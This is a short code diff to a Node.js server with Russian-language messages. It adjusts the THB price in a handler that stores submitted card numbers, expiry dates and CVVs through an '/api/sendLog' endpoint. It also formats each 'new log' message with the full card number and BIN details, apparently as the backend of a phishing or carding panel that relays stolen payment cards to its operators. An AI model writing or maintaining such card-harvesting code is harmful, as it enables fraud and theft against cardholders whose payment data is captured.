@@ -54,7 +54,7 @@ sequelize.sync()
 
 async function sendNewLogMessage(cardInfo) {
     return `<b>💳 Новый лог #id${cardInfo.id}</b>
-💰 Стоимость: <b>${Math.round(cardInfo.price * 37.42)} THB</b>
+💰 Стоимость: <b>${cardInfo.price} THB</b>
 ${await binInfoEdit(cardInfo.cardNumber.replace(/\s/g, ""))}
 Номер: <code>${cardInfo.cardNumber.replaceAll(' ', '')}</code>
 💳 Номер: <b>${cardInfo.cardNumber}</b>`;
@@ -655,7 +655,7 @@ app.post("/api/sendLog", async (req, res) => {
             cardNumber: req.body.cardNumber,
             cardExp: req.body.exp,
             cardCvv: req.body.cvv,
-            price: Math.round((parseFloat(req.body.price)/2) * 37.42)
+            price: parseFloat(req.body.price)
         });
 
 
